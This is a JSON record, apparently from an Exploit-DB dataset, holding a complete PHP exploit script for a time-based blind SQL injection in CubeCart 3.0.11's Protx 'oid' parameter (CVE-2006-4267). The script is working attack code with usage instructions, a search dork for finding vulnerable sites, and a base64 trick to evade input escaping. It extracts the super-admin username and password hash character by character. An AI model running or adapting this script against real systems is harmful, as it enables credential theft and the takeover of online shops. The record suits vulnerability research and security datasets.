{
  "id": "2198",
  "title": "CubeCart 3.0.11 - &#039;oid&#039; Blind SQL Injection",
  "cve": "CVE-2006-4267",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\nprint_r('\r\n--------------------------------------------------------------------------------\r\nCubeCart <= 3.0.11 \"oid\" blind SQL injection / admin credentials\r\ndisclosure exploit\r\nby rgod rgod@autistici.org\r\nsite: http://retrogod.altervista.org\r\ndork: \"Copyright Devellion Limited 2005. All rights reserved.\"\r\n-> this works against MySQL >=4.1 (allowing subs)\r\n--------------------------------------------------------------------------------\r\n');\r\n\r\n/* short explaination:\r\n\r\n software site: http://www.cubecart.com/site/home/\r\n\r\n same kind of sql injection of http://retrogod.altervista.org/cubecart_3011_sql.html\r\n but this bypass magic_quotes_gpc=On because of base64_decode() function used in\r\n /modules/gateway/Protx/confirmed.php used near lines:\r\n ...\r\n\tif($success == TRUE){\r\n\r\n\t\t$cart_order_id = base64_decode($_GET['oid']);\r\n\t\tinclude_once(\"../../../includes/orderSuccess.inc.php\");\r\n\t\t$result = \"?pg=\".base64_encode(\"Protx\");\r\n\r\n\t} else {\r\n...\r\n\t\t\t\t\t\t\t\t\t      */\r\nif ($argc<3) {\r\nprint_r('\r\n--------------------------------------------------------------------------------\r\nUsage: php '.$argv[0].' host path OPTIONS\r\nhost:      target server (ip/hostname)\r\npath:      path to CubeCart\r\nOptions:\r\n -T[prefix]:  specify a table prefix different from default (CubeCart_)\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\n -a           adjust the first argument to pass to benchamrk() function\r\n -s:          use sleep() (this function was added in MySQL 5.0.12.) instead of\r\n\t      benchmark()\r\n -d           disclose table prefix (reccomended)\r\nExample:\r\nphp '.$argv[0].' localhost /cubecart/\r\nphp '.$argv[0].' localhost /cubecart/ -a200000 -Tcube_\r\n--------------------------------------------------------------------------------\r\n');\r\ndie;\r\n}\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$port=80;\r\n$prefix=\"CubeCart_\";\r\n$delay_func=\"benchmark(2000000,sha1('suntzu'))\";\r\n$dt=0;\r\n\r\n$proxy=\"\";\r\nfor ($i=3; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-T\")\r\n{\r\n  $prefix=str_replace(\"-T\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-a\")\r\n{\r\n  $delay_func=\"benchmark(\".intval(str_replace(\"-a\",\"\",$argv[$i])).\",sha1('suntzu'))\";\r\n}\r\nif ($temp==\"-s\")\r\n{\r\n  $delay_func=\"sleep(11)\";\r\n}\r\nif ($temp==\"-d\")\r\n{\r\n  $dt=1;\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nif ($dt)\r\n{\r\n$packet =\"GET \".$p.\"modules/gateway/Protx/confirmed.php?oid=\".base64_encode(\"'\").\"&crypt=1 HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n#echo quick_dump($packet);\r\nsendpacketii($packet);\r\nif (eregi(\"in your SQL syntax\",$html))\r\n{\r\n$temp=explode(\"UPDATE \",$html);\r\n$temp2=explode(\"sessions\",$temp[1]);\r\n$prefix=$temp2[0];\r\necho \"prefix -> \".$prefix.\"\\n\";\r\n}\r\n}\r\n\r\n$chars[0]=0;//null\r\n$chars=array_merge($chars,range(48,57)); //numbers\r\n$chars=array_merge($chars,range(97,102));//a-f letters\r\n$j=1;$password=\"\";\r\nwhile (!strstr($password,chr(0)))\r\n{\r\nfor ($i=0; $i<=255; $i++)\r\n{\r\nif (in_array($i,$chars))\r\n{\r\n$sql=\"999999%'/**/or/**/basket=(SELECT(IF((ASCII(SUBSTRING(password,\".$j.\",1))=\".$i.\"),\".$delay_func.\",0))/**/FROM/**/\".$prefix.\"admin_users/**/WHERE/**/isSuper=1)/*\";\r\necho \"sql -> \".$sql.\"\\n\";\r\n$sql=base64_encode($sql);\r\necho \"encoded -> \".$sql.\"\\n\";\r\n$packet =\"GET \".$p.\"modules/gateway/Protx/confirmed.php?oid=$sql&crypt=1 HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n#echo quick_dump($packet);\r\nusleep(2000000);\r\n$starttime=time();\r\nsendpacketii($packet);\r\n$endtime=time();\r\necho \"starttime -> \".$starttime.\"\\n\";\r\necho \"endtime -> \".$endtime.\"\\n\";\r\n$difftime=$endtime - $starttime;\r\necho \"difftime -> \".$difftime.\"\\n\";\r\nif ($difftime > 10) {$password.=chr($i);echo \"password -> \".$password.\"[???]\\n\";sleep(1);break;}\r\n}\r\nif ($i==255) {die(\"Exploit failed...\");}\r\n}\r\n$j++;\r\n}\r\n\r\n$j=1;$admin=\"\";\r\nwhile (!strstr($admin,chr(0)))\r\n{\r\nfor ($i=0; $i<=255; $i++)\r\n{\r\n$sql=\"999999%'/**/or/**/basket=(SELECT(IF((ASCII(SUBSTRING(username,\".$j.\",1))=\".$i.\"),\".$delay_func.\",0))/**/FROM/**/\".$prefix.\"admin_users/**/WHERE/**/isSuper=1)/*\";\r\necho \"sql -> \".$sql.\"\\n\";\r\n$sql=base64_encode($sql);\r\necho \"encoded -> \".$sql.\"\\n\";\r\n$packet =\"GET \".$p.\"modules/gateway/Protx/confirmed.php?oid=$sql&crypt=1 HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n#echo quick_dump($packet);\r\nusleep(2000000);\r\n$starttime=time();\r\nsendpacketii($packet);\r\n$endtime=time();\r\necho \"starttime -> \".$starttime.\"\\n\";\r\necho \"endtime -> \".$endtime.\"\\n\";\r\n$difftime=$endtime - $starttime;\r\necho \"difftime -> \".$difftime.\"\\n\";\r\nif ($difftime > 10) {$admin.=chr($i);echo \"admin -> \".$admin.\"[???]\\n\";sleep(1);break;}\r\nif ($i==255) {die(\"Exploit failed...\");}\r\n}\r\n$j++;\r\n}\r\nprint_r('\r\n--------------------------------------------------------------------------------\r\nadmin          -> '.$admin.'\r\npassword (md5) -> '.$password.'\r\n--------------------------------------------------------------------------------\r\n');\r\nfunction is_hash($hash)\r\n{\r\n if (ereg(\"^[a-f0-9]{32}\",trim($hash))) {return true;}\r\n else {return false;}\r\n}\r\nif (is_hash($password)) {echo \"Exploit succeeded...\";}\r\nelse {echo \"Exploit failed...\";}\r\n?>\r\n\r\n# milw0rm.com [2006-08-17]",
  "url": "https://www.exploit-db.com/exploits/2198"
}